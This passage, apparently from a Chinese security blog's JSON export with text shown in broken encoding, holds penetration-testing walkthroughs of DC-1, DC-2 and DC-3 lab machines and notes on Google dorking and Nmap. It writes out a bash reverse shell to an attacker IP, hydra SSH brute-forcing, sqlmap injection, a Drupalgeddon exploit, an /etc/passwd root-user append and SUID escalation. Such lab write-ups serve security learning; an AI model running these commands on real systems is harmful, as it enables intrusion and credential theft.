å¯ä»¥æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨ä¹‹ç±»çš„,ä¸‹mainä¹Ÿæœ‰è¯­å¥You have selected :ls -l,è¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„,æŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹ æœç„¶å­˜åœ¨radioå‚æ•°,å¯ä»¥æ§åˆ¶æˆ‘ä»¬æ‰€æ‰§è¡Œçš„å‘½ä»¤ é‚£ä¹ˆæˆ‘ä»¬åå¼¹ä¸€ä¸ªshell bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/192.168.182.137/2333+0&gt;%261&#39; åœ¨homeç›®å½•ä¸‹å‘ç°jimç”¨æˆ·,é‡Œé¢æœ‰ä¸ªbackupæ–‡ä»¶æ”¾äº†old-password,æ‹¿æ¥çˆ†ç ´ä¸€ä¸‹sshï¼Œ hydra -l jim -P jim.txt 192.168.182.144 ssh -s 22 æˆåŠŸçˆ†å‡ºå¯†ç  è¿æ¥ssh ssh jim@192.168.182.144 -p 22 ææƒä½¿ç”¨sudo -l æœç´¢å…·å¤‡suidå±æ€§çš„æ–‡ä»¶ find / -perm -u=s -type f 2&gt;/dev/null æ²¡æœ‰å‘ç°å¯åˆ©ç”¨çš„å‘½ä»¤ æŸ¥çœ‹ä¸€ä¸‹ç›®å½•ä¸‹çš„æ–‡ä»¶ æœ‰ä¸€å°é‚®ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ å‘ç°äº†charlesç”¨æˆ·ç»™jimç”¨æˆ·ä»–çš„å¯†ç ,^xHhA&amp;hvim0y su charlesæˆåŠŸç™»å½•charlesç”¨æˆ· sudo -l å‘ç°è¯¥ç”¨æˆ·æœ‰ä¸€ä¸ªrootæƒé™çš„å‘½ä»¤ï¼šteeheeï¼ŒæŸ¥çœ‹è¯¥å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•ï¼š æœ‰ä¸€ä¸ª-aå¯ä»¥å¯¹æŒ‡å®šæ–‡ä»¶è¿›è¡Œè¿½åŠ ï¼Œä¸è¦†ç›–ï¼Œæµ‹è¯•ä½¿ç”¨ ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨/etc/passwdæ–‡ä»¶ä¸‹æ·»åŠ æ–°çš„ç”¨æˆ·ä½¿è¿™ä¸ªç”¨æˆ·å…·æœ‰rootæƒé™ abc::0:0:::/bin/bash ç”¨æˆ·åï¼šæ˜¯å¦æœ‰å¯†ç ä¿æŠ¤ï¼šuid(root)ï¼šå…¨ç§°ï¼šå®¶ç›®å½•ï¼šç™»é™†çŠ¶æ€ æˆåŠŸæ·»åŠ  æ‹¿åˆ°flag","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-3","slug":"DC-3","date":"2021-02-15T05:51:29.000Z","updated":"2021-02-23T05:01:20.037Z","comments":false,"path":"2021/02/15/DC-3/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/15/DC-3/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.143 å‘ç°80ç«¯å£æ˜¯æ‰“å¼€çš„,è®¿é—®ä¸€ä¸‹ ç”¨çš„Joomlaæ¨¡æ¿ cmsæ‰«æä½¿ç”¨joomscanæ‰«æå·¥å…·æ‰«æJoomlaç›¸å…³é…ç½®å†…å®¹ã€åšæŒå·²çŸ¥æ¼æ´ç­‰ç­‰ æ‰«æåå¾—çŸ¥Joomlaç‰ˆæœ¬3.7.0ï¼Œç®¡ç†å‘˜ç™»å½•é¡µé¢ï¼ŒåŠä¸€äº›å¯ä»¥è®¿é—®çš„ç½‘ç«™ç›®å½• cd joomscan perl joomscan.pl -u å‘ç°ç‰ˆæœ¬ä¸º3.7.0 æ‰«æå‡ºç™»å…¥ç•Œé¢ : [+] admin finder [++] Admin page : http://192.168.182.143/administrator/ æ¼æ´æ¢æµ‹// nmap --script=vuln 192.168.182.143 æ‰«æå¾—å‡ºCMSç‰ˆæœ¬3.7.0 å­˜åœ¨æ•°æ®åº“æ³¨å…¥æ¼æ´ä»¥åŠæ¼æ´ç¼–å· ä½¿ç”¨searchsploitå·¥å…·æŸ¥æ‰¾Joomla 3.7.0 ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´ï¼Œä¹Ÿå¯ä»¥å‘ç°ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´ searchsploit Joomla 3.7.0 cp /usr/share/exploitdb/exploits/php/webapps/42033.txt jommla-370-sqli.txt cat Joomla-370-sqli.txt æŸ¥çœ‹æ¼æ´çš„åˆ©ç”¨æ–¹æ³• æ¼æ´åˆ©ç”¨æ•°æ®åº“æ³¨å…¥æ”»å‡»sqlmap -u &quot;http://192.168.182.143/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] çˆ†è¡¨å sqlmap -u &quot;http://192.168.182.143/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables //æ¢æµ‹è¡¨å #_users çˆ†åˆ— çˆ†æ•°æ® Johnè§£å¯†// vim 1.txt åˆ›å»ºä¸€ä¸ªç”¨äºæ”¾æ•£åˆ—å¯†ç çš„æ–‡æ¡£1.txt // john --wordlist=rockyou.txt 1.txt johnè§£å¯† // sudo john 1.txt --show å¾—å‡ºå¯†æ–‡ï¼šsnoopy æˆåŠŸç™»å½•åå° Getshellåœ¨åå°æˆ‘ä»¬æ‰¾åˆ°äº†å¯ä»¥ä¿®æ”¹çš„phpä»£ç ,åå¼¹shell æˆåŠŸæ‹¿åˆ°shell ææƒä¿¡æ¯æœé›† //uname -a //lsb_release -a æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œå‘ç°Ubuntuç‰ˆæœ¬16.04 è½¬åˆ°kaliæŸ¥æ‰¾æ¼æ´ //searchsploit Ubuntu 16.04 // searchsploit 39772.txt -p //cp /usr/share/exploitdb/exploits/linux/local/39772.txt 39772.txt //cat 39772.txt å‘ç°æ–¹æ³• Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip å‘ç°ææƒæ¼æ´ å› ä¸ºç»™å‡ºçš„åœ°å€æ— æ³•è¿æ¥,ä¹Ÿæ²¡æœ‰åœ¨å…¶ä»–åœ°æ–¹æ‰¾åˆ°exp,å¾ˆé—æ†¾å°±åˆ°æ­¤ç»“æŸäº†","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-2","slug":"DC-2","date":"2021-02-12T06:54:22.000Z","updated":"2021-03-30T13:36:17.535Z","comments":false,"path":"2021/02/12/DC-2/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/12/DC-2/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°ä½¿ç”¨nmapæ‰«æè¯¥ç½‘æ®µï¼Œå‘ç°dc-2çš„ipä¸º192.168.182.140 ä½†æ˜¯è®¿é—®æç¤ºdnsè§£æé”™è¯¯ ä¿®æ”¹hostsæ–‡ä»¶ 192.168.182.140 dc-2 ç„¶åå‡ºç°ç½‘ç«™ å‘ç°flag1 ç›®å½•çˆ†ç ´æç¤ºä½¿ç”¨cewlå­—å…¸ç”Ÿæˆï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‘ç°ç™»å½•æ¡†ï¼Œä½¿ç”¨æ‰«æå™¨ç»è¡Œæ‰«æ å‘ç°ç™»å½•ç•Œé¢wp-login.php æš´åŠ›ç ´è§£ä½¿ç”¨cewlæ‰«æå¯†ç ä½¿ç”¨æ–¹æ³•:https://www.freebuf.com/articles/network/190128.html ä½¿ç”¨wpscanæ‰«æç”¨æˆ·åä½¿ç”¨æ–¹æ³•: https://www.freebuf.com/sectool/174663.html wpscan â€“url 192.168.182.140 å°†å¯†ç ä¿å­˜åœ¨user.txtæ–‡ä»¶ä¸­ ç„¶åä½¿ç”¨ wpscan â€“url http://dc-2 -U user.txt -P pass2.txt æš´åŠ›ç ´è§£ï¼ŒæˆåŠŸç ´è§£å‡ºå¯†ç  | Username: jerry, Password: adipiscing | Username: tom, Password: parturient ä½¿ç”¨jerryæˆåŠŸæ‰¾åˆ°flag2 æç¤ºå¤±è´¥,ç„¶åæˆ‘ä»¬è¿˜æœ‰å¦å¤–ä¸€ä¸ª7744ç«¯å£æ˜¯å¼€å¯çš„ sshç ´è§£ç™»å½•SSH æŒ‡å®šå¯†é’¥ï¼Œè¿æ¥è¿œç¨‹æœåŠ¡å™¨ã€‚ ssh -i /root/.ssh/ido_sch_pro ido@192.168.1.111 -p 7744 å¦‚ä¸Šï¼Œ /root/.ssh/ido_sch_pro ï¼šå¯†é’¥æ–‡ä»¶è·¯å¾„ ido@192.168.1.111 ï¼šéœ€è¦è¿æ¥çš„æœåŠ¡å™¨ç”¨æˆ·å &amp; IP -p 7744 ï¼š ç«¯å£7744 ä½¿ç”¨hydraå·¥å…·ä½¿ç”¨å·²ç”Ÿæˆçš„å¯†ç å­—å…¸å¯¹å·²çŸ¥çš„ç”¨æˆ·åè¿›è¡Œsshç™»å½•å¯†ç çˆ†ç ´ï¼Œè·å¾—sshç™»å½•ç”¨æˆ·ï¼štom / parturient hydra -L user.txt -P pass.txt 192.168.182.140 ssh -s 7744 login: tom password: parturient ssh tom@192.168.182.140 -p 7744 æˆåŠŸç™»å½• lså‘ç°æœ‰ä¸ªflag3.txtæ–‡ä»¶,å°è¯•æŸ¥çœ‹å‘ç° ä½†æ˜¯å‘ç°viå¯ä»¥ä½¿ç”¨ ä½¿ç”¨viå‘½ä»¤æŸ¥çœ‹flag3.txt Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. æç¤ºåˆ‡æ¢ç”¨æˆ· ææƒRestricted shellç»•è¿‡http://www.const27.com/2020/07/03/rbash%E7%BB%95%E8%BF%87/ https://xz.aliyun.com/t/7642 https://www.freebuf.com/articles/system/188989.html https://mp.weixin.qq.com/s/3ae2NLq5pxURy6aMFon-hA å°è¯•å‘ç°viå¯ä»¥ä½¿ç”¨ æ‰§è¡Œå‘½ä»¤ vi 1 :set shell=/bin/sh :shell #æ·»åŠ ç¯å¢ƒå˜é‡ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ï¼ˆè®¾ç½®ç¯å¢ƒå˜é‡ï¼‰ ä½¿ç”¨viææƒè·å¾—å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤ ä½¿ç”¨ä¹‹å‰jerryçˆ†å‡ºæ¥çš„å¯†ç åˆ‡æ¢ä¸ºjerryç”¨æˆ· æŸ¥çœ‹flag4 Good to see that youâ€™ve made it this far - but youâ€™re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - youâ€™re on your own now. :-) Go on - git outta here!!!! è¿˜å·®æœ€åä¸€ä¸ª gitææƒsudo -l #æŸ¥çœ‹éƒ½å¯ä»¥ä½¿ç”¨rootæƒé™æ— å¯†ç çš„å‘½ä»¤,å‘ç°gitå‘½ä»¤ sudo git -p â€“-help #ææƒ æˆåŠŸæ‰¾åˆ°äº”ä¸ªflag","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"DC-1","slug":"é¶æœºDC-1","date":"2021-02-09T06:55:37.000Z","updated":"2021-02-20T01:44:38.096Z","comments":false,"path":"2021/02/09/é¶æœºDC-1/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/09/é¶æœºDC-1/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°æ‰“å¼€é¶æœºï¼Œè°ƒæˆnetæ¨¡å¼ ä½¿ç”¨namp -sN 192.168.182.0/24 æ¢æµ‹åˆ°ä¸»æœº ç„¶åæ¢æµ‹ç«¯å£ï¼Œå‘ç°80ç«¯å£æ‰“å¼€ è®¿é—®80ç«¯å£ å‘ç°ä¸‹æ–¹å†™äº†ä½¿ç”¨Durpalæ¨¡æ¿,è€Œä¸”è¿™ä¸ªå°æ’ä»¶ä¹Ÿèƒ½è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼ˆè°·æ­Œåº”ç”¨å•†åº—å¯ä»¥æœåˆ°ï¼‰ æ¼æ´å‘ç°ä¸åˆ©ç”¨æ¼æ´æŸ¥æ‰¾ä½¿ç”¨Metasploitæœç´¢Drupal $ sudo msfdb init &amp;&amp; msfconsole $ search Drupal é€‰æ‹©æ¨¡å— ç„¶åæŒ¨ç€è¯•,å¯ä»¥æœ‰é™é€‰æ‹©Rankä¸ºexcellentçš„,ä¸”æ›´æ–°æ—¶é—´é åçš„ è¿™é‡Œæˆ‘ä»¬ç”¨äº†2018å¹´çš„ $ use exploit/unix/webapp/drupal_drupalgeddon2 $ show options $ set RHOSTS 192.168.192.139 $ exploit æˆ–è€… run æˆåŠŸåå¼¹shell ç„¶ååœ¨è¯¥ç›®å½•ä¸‹å‘ç°äº†flag1.txt æ¯ä¸€ä¸ªå¥½çš„cmséƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶,ä½ ä¹Ÿæ˜¯ ç„¶åç™¾åº¦è¯¥cmsçš„é…ç½®æ–‡ä»¶ç›®å½•ä½ç½® /** * * flag2 * Brute force and dictionary attacks aren&#39;t the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */ *æ ‡å¿—2 *æš´åŠ›å’Œå­—å…¸æ”»å‡»ä¸æ˜¯æœ€å¥½çš„é€‰æ‹© *è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆæ‚¨å°†éœ€è¦è®¿é—®æƒé™ï¼‰ã€‚ *ä½ èƒ½ç”¨è¿™äº›è¯ä¹¦åšä»€ä¹ˆï¼Ÿ ç„¶åè¿˜å‘ç°äº†æ•°æ®åº“çš„è´¦å·è·Ÿå¯†ç  å°è¯•è¿æ¥ä¸€ä¸‹æ•°æ®åº“ meterpreter &gt; mysql -u dbuser -p ç»“æœä¸€ç›´è¿”å› Unknown command: mysql. æ¢ä¸€ä¸‹å£³ è¾“å…¥shell ç„¶åè¾“å…¥å‘½ä»¤å‘ç°æœ‰é—®é¢˜,ç„¶åçœ‹ä»–ä»¬è¯´çš„æ˜¯å› ä¸ºè¿™ä¸æ˜¯äº¤äº’å¼shellï¼Œéœ€è¦è·å–äº¤äº’å¼shell ä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shellï¼Œç„¶åæˆ‘ä»¬ç™»é™†æ•°æ®åº“ å†æ¬¡è¿›å…¥shellä¸‹ï¼Œè¾“å…¥pythonå‘½ä»¤ï¼Œå‘ç°é¶æœºå·²å®‰è£…python 2.7.3ï¼Œé€šè¿‡pty.spawn()è·å¾—äº¤äº’å¼shell meterpreter &gt; shell python -V python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; å¯ä»¥è·å–åˆ°å¯†ç å¯†æ–‡ ç„¶åå…ˆå»è¡¥è¡¥åŠŸè¯¾å§ è¿™é‡Œå°±ç›´æ¥copyå¸ˆå‚…ä»¬çš„äº† æ–¹æ³•ä¸€ï¼š åœ¨exploitdbä¸­æœ‰ä¸€ä¸ªé’ˆå¯¹Drupal 7ç‰ˆæœ¬çš„æ”»å‡»è„šæœ¬ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·è´¦å·ï¼Œä½¿ç”¨æ­¤æ–¹æ³•ç®€ä¾¿äº†ç ´è§£adminçš„å¯†ç ï¼Œæ›´ç›´æ¥ æŸ¥çœ‹Drupalç‰ˆæœ¬,ç¡®å®šDrupalç‰ˆæœ¬ä¸º7.24 cat /var/www/includes/bootstrap.inc | grep VERSION msf &gt; searchsploit drupal #æŸ¥æ‰¾é’ˆå¯¹Drupalçš„æ”»å‡»è„šæœ¬ æ”»å‡»è„šæœ¬é€‚ç”¨äº7.31ä»¥ä¸‹ï¼Œæ‰€ä»¥é€‚åˆ7.24ç‰ˆæœ¬ åˆ©ç”¨drupal7.0ç‰ˆæœ¬æ¼æ´å¢åŠ æœ‰adminæƒé™çš„ç”¨æˆ·ï¼šadmin1/admin1 python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.220.130 -u admin1 -p admin1 æŸ¥çœ‹usersè¡¨ï¼Œæ·»åŠ admin1æˆåŠŸ ä½¿ç”¨æ–°æ·»åŠ çš„ç”¨æˆ·admin1/admin1ç™»å½•ç½‘ç«™ï¼Œåœ¨contentæ¨¡å—ä¸‹ï¼Œæ‰¾åˆ°flag3 æ–¹æ³•äºŒï¼š ä½¿ç”¨Drupalå¯¹æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ï¼ŒåŠ å¯†è„šæœ¬ä½ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„scriptsä¸‹ ä½¿ç”¨åŠ å¯†è„šæœ¬åŠ å¯†æ–°å¯†ç 123456ï¼Œç”ŸæˆåŠ å¯†å¯†æ–‡ ./scripts/password-hash.sh 123456 password: 123456 hash: $S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼Œæ›´æ–°ä¸ºæ–°å¯†ç ï¼š123456 update drupaldb.users set pass=&quot;$S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY&quot; where uid=1; ä½¿ç”¨ç”¨æˆ·admin/123456ç™»å½•ç½‘ç«™ï¼Œåœ¨contentæ¨¡å—ä¸‹ï¼Œæ‰¾åˆ°flag3 ç„¶åè·å–æç¤º Special PERMS will help FIND the passwd - but youâ€™ll need to -exec that command to work out how to get whatâ€™s in the shadow. ç‰¹æ®Šçš„PERMSå¯ä»¥å¸®åŠ©æ‰¾åˆ°å¯†ç -ä½†æ‚¨éœ€è¦-execè¯¥å‘½ä»¤æ¥ç¡®å®šå¦‚ä½•è·å–éšè—çš„å†…å®¹ã€‚ Flag3æç¤ºè¯æœ‰permsã€findã€-execã€shadowå…±å››ä¸ªç‰¹æ®Šæç¤ºè¯ åº”è¯¥è¦æŸ¥çœ‹shadowæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨findå‘½ä»¤ææƒ ä½¿ç”¨findå‘½ä»¤æŸ¥æ‰¾æœ‰ç‰¹æ®Šæƒé™suidçš„å‘½ä»¤ find / -perm -4000 ä½¿ç”¨findå‘½ä»¤ææƒ find ./ aaa -exec &#39;/bin/sh&#39; \\; æŸ¥çœ‹/etc/shadow æ–‡ä»¶ï¼Œå‘ç°flag4ç”¨æˆ·ï¼Œå¹¶ä¸”flag4ç”¨æˆ·å¯ä»¥ç™»å½•å¹¶ä¸”æœ‰å¯†ç ï¼Œæ‰€ä»¥å­˜åœ¨flag4çš„å®¶ç›®å½• cat /etc/shadow flag4ç”¨æˆ·å¯†ç å¯ä»¥ä½¿ç”¨sshç™»å½•è¿›è¡Œçˆ†ç ´ï¼Œå¦‚ä¸‹ï¼š wget http://www.openwall.com/john/j/john-1.8.0.tar.gz #ä¸‹è½½Johnå¯†ç åŒ… tar -xvf john-1.8.0.tar.gz #è§£å‹ç¼© cd john-1.8.0/ src #è¿›å…¥æºç ç›®å½•ä¸‹ uname -a #æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ make linux-x86-64 #ç¼–è¯‘å¹¶æŒ‡å®šå½“å‰çš„Linuxç³»ç»Ÿç‰ˆæœ¬ ä½¿ç”¨hydra+Johnå¯†ç åŒ…å¯¹flag4çš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œçˆ†ç ´å¯†ç ä¸ºï¼šflag4/orange hydra -l flag4 -P john-1.8.0/run/password.lst ssh://192.168.220.130 -f -vV -o hydraflag4.ssh login: flag4 password: orange ä½¿ç”¨flag4ç”¨æˆ·å¯ä»¥é€šè¿‡sshç™»å½•ç³»ç»Ÿ ssh flag4@192.168.220.130 å¯†ç ï¼šorange è¿›å…¥flag4ç”¨æˆ·çš„å®¶ç›®å½•/home/flag4ï¼Œæ‰¾åˆ°flag4.txtæ–‡æœ¬æ–‡ä»¶ï¼Œæ‰¾åˆ°flag4 cd /home/flag4 cat flag4.txt Flag4: Can you use this same method to find or access the flag in root? Probably. But perhaps itâ€™s not that easy. Or maybe it is? ä½ èƒ½ç”¨åŒæ ·çš„æ–¹æ³•æ¥æŸ¥æ‰¾æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„æ ‡å¿—å—ï¼Ÿ å¯èƒ½ã€‚ä½†ä¹Ÿè®¸ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“ã€‚æˆ–è®¸æ˜¯è¿™æ ·ï¼Ÿ åœ¨flag4ä¸­æç¤ºåœ¨rootæ ¹ç›®å½•ä¸‹å­˜åœ¨ï¼Œè¿›å…¥åˆ°rootå®¶ç›®å½•/rootä¸‹æ‰¾åˆ°thefinalflag.txtæ–‡æœ¬æ–‡ä»¶ cd /root cat thefinalflag.txt thefinalflag: Well done!!!! Hopefully youâ€™ve enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 åšå¾—å¥½ï¼ï¼ï¼ï¼ï¼ å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸ªå¹¶å­¦åˆ°äº†ä¸€äº›æ–°çš„æŠ€èƒ½ã€‚ ä½ å¯ä»¥è®©æˆ‘çŸ¥é“ä½ å¯¹è¿™æ¬¡å°æ—…è¡Œçš„çœ‹æ³•ã€‚ é€šè¿‡Twitterè”ç³»æˆ‘-@dcau7 äº”ä¸ªflagå…¨éƒ¨æ‰¾åˆ°ï¼Œå¹¶å­¦ä¹ åˆ°ä½¿ç”¨msfconsoleæ¡†æ¶ï¼ŒåŠä½¿ç”¨findå‘½ä»¤æ‰¾suidå’Œææƒ å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/weixin_43583637/article/details/101542749 https://www.freebuf.com/articles/network/218073.html","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"ä¿¡æ¯æœé›†","slug":"ä¿¡æ¯æœé›†","date":"2021-02-08T07:28:22.000Z","updated":"2021-03-31T15:13:36.692Z","comments":true,"path":"2021/02/08/ä¿¡æ¯æœé›†/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/08/ä¿¡æ¯æœé›†/","excerpt":"","text":"æœç´¢å¼•æ“Google Hackingç¬¦å·ï¼ˆç±»ä¼¼äºæ­£åˆ™åŒ¹é…ï¼‰ -keyword ä¸å…³é”®è¯ä¸ç›¸å…³ *KEYWORD* ä¸å…³é”®è¯ç›¸å…³ â€œKEYWORDâ€ å¼ºåˆ¶æœç´¢ç›¸å…³å…³é”®è¯ï¼ˆè‹¥é‡Œé‡Œé¢æœ‰ä¸¤ä¸ªè¯,å¿…é¡»ä¸¤ä¸ªè¯åŒæ—¶å­˜åœ¨ï¼‰ siteï¼ˆæœç´¢æŒ‡å®šåŸŸåçš„ç½‘ç«™ï¼‰ä¸¾ä¾‹ site:zhihu.com æœç´¢è·ŸçŸ¥ä¹ç›¸å…³çš„ç½‘é¡µ â€œwebå®‰å…¨â€ site:zhihu.com æœç´¢çŸ¥ä¹è·Ÿwebå®‰å…¨ç›¸å…³çš„ç½‘é¡µ â€œsqlæ³¨å…¥â€ site:csdn.net åœ¨csdn.netæœç´¢è·Ÿsqlæ³¨å…¥ç›¸å…³çš„å†…å®¹ â€œæ•™ç¨‹â€ site:pan.baidu.com åœ¨ç™¾åº¦ç½‘ç›˜ç§æœç´¢æ•™ç¨‹ filetype(æŒ‡å®šæ–‡ä»¶ç±»å‹) nmap filetype:pdf æŸ¥æ‰¾nmapç›¸å…³çš„pdfæ–‡ä»¶ â€œwebå®‰å…¨â€ filetype:PPT æŸ¥æ‰¾webå®‰å…¨ç›¸å…³PPT inurl(æœç´¢urlç½‘å€å­˜åœ¨ç‰¹å®šå…³é”®å­—çš„ç½‘é¡µ) inurl:php?id= æœç´¢ç½‘ç«™URLä¸­åŒ…å«äº†php?id= inurl:/admin/login.php æœç´¢ç½‘ç«™URLä¸­åŒ…å«äº†/admin/login.php inurl:login æœç´¢ç½‘ç«™URLä¸­åŒ…å«äº†login intitle(æœç´¢titleå­˜åœ¨ç‰¹å®šå…³é”®å­—çš„ç½‘é¡µ) intitle:åå°ç®¡ç† filetype:php æœç´¢åå°ç®¡ç†,phpç±»å‹ intitle:index of â€œparent directoryâ€ æœç´¢æ ¹ç›®å½•ç›¸å…³çš„ç´¢å¼•ç›®å½•ä¿¡æ¯ intitle:index of â€œpasswordâ€ æœç´¢å¯†ç ç›¸å…³çš„ç´¢å¼•ç›®å½•ä¿¡æ¯ intitle:index of â€œadminâ€ æœç´¢åå°ç®¡ç†ç•Œé¢ intext(æœç´¢ç½‘é¡µå†…å®¹å­˜åœ¨ç‰¹å®šå…³é”®å­—çš„ç½‘é¡µ) intext:Powered by Discuz æœç´¢Discuzè®ºå›ç›¸å…³çš„ç•Œé¢ intext:Powered by wordpress æœç´¢wordpressåˆ¶ä½œçš„åšå®¢ç½‘å€ intext:Powered by *CMS æœç´¢*CMSç›¸å…³çš„ç•Œé¢ intext:powered by xxx inurl:login æœç´¢æ­¤ç±»ç½‘å€çš„åå°ç™»å½•ç•Œé¢ Shodan Hackingé™¤äº†å¯ä»¥æœç´¢å¸¸è§çš„webæœåŠ¡å™¨,è¿˜èƒ½æ‰«æé˜²ç«å¢™ã€è·¯ç”±å™¨ã€æ‘„åƒå¤´ç­‰ä¸€åˆ‡è”ç½‘çš„è®¾å¤‡ã€‚æ”¾ä¸ªç®€ä»‹,ç°åœ¨è¿˜ç”¨ä¸ä¸Š ZoomEye HackingZoomEye(é’Ÿé¦—ä¹‹çœ¼),å¯ä»¥çœ‹åšæ˜¯â€å›½äº§çš„Shodanâ€,ç”±çŸ¥é“åˆ›å®‡å‡ºå“ å®˜ç½‘: https://www.zoomeye.org/ ç›®æ ‡æ‰«æNmapæŸ¥ç”¨å‘½ä»¤ å‘½ä»¤ ä½œç”¨ -help æŸ¥çœ‹å¸®åŠ© -sn æ¢æµ‹ä¸»æœº -sS æ¢æµ‹æœåŠ¡ -O åˆ¤æ–­ç³»ç»Ÿ -sV æ‰«æå…·ä½“æœåŠ¡çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚80ç«¯å£çš„apacheç‰ˆæœ¬ -A ç»¼åˆæ‰«æï¼Œ æ¯”å¦‚-O è·Ÿ-sV(å¦‚æœä½ ä¸æƒ³å†™-0è·Ÿ-sVé‚£å°±ç›´æŒ‰ç”¨-Aå³å¯) è„šæœ¬åŠ è½½æˆ‘ä»¬å¹³æ—¶æ‰«æé»˜è®¤ä½¿ç”¨çš„æ˜¯ namp â€“script=default 192.168.182.0/24 ç„¶è€Œnampè¿˜æœ‰å¾ˆå¤šè„šæœ¬å¯ä»¥ä¾›æˆ‘ä»¬ä½¿ç”¨,å¦‚: â€‹ è¯¦ç»†è„šæœ¬ä¿¡æ¯å¯ä»¥æŸ¥çœ‹https://nmap.org/book/nse-usage.html -O åˆ¤æ–­æ˜¯ä»€ä¹ˆç³»ç»Ÿ -sV ç‰ˆæœ¬æ£€æµ‹ æ¯”å¦‚æ‰«å‡ºäº†SSHç«¯å£ ç„¶åå¾—å‡ºä»–çš„ç‰ˆæœ¬å· -A æ„æ€å°±æ˜¯ä½¿ç”¨æ‰€æœ‰ æ¯”å¦‚-O è·Ÿ-sV(å¦‚æœä½ ä¸æƒ³å†™-0è·Ÿ-sVé‚£å°±ç›´æŒ‰ç”¨-Aå³å¯) -P æ‰«ææŒ‡å®šçš„è¯·å£-P 1-65535æˆ–P 80,8080,1433 -v è¾“å‡ºè¯¦ç»†ä¿¡æ¯ -T4 æ‰«æé€Ÿåº¦(1-5) èœ—ç‰›ï¼Œé¬¼é¬¼æ¥ç´¢ï¼Œæœ‰ç¤¼è²Œçš„ï¼Œæ­£å¸¸çš„ï¼Œä¾µç•¥æ€§çš„-Tå°±æ˜¯æ­£å¸¸çš„ -sS äºŒæ¬¡æ¡æ‰‹ â€“exclude æ’é™¤ä¸»æœºæˆ–ç½‘ç»œã€‚ â€“excludefile æ’é™¤æ–‡ä»¶ä¸­çš„åˆ—è¡¨ã€‚ â€“host-timeout 10 